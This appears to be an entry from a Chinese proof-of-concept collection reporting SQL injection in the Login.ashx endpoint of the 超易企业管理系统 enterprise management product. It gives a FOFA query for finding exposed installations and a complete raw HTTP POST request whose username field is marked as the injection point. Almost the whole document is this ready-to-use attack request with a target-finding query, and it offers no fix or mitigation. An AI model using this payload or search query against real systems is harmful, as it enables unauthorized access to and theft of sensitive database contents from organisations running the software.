# 超易企业管理系统Login.ashx存在SQL注入漏洞

超易企业管理系统存在SQL注入漏洞，攻击者可获取数据库敏感信息。

## fofa

```yaml
"超易企业管理系统"
```

## poc

```java
POST /ajax/Login.ashx?Date=%271721821198459%27 HTTP/1.1
Host: 
Content-Length: 92
Accept: text/plain, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.171 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

username=admin*&password=admin123&loginguid=&logintype=pc
```

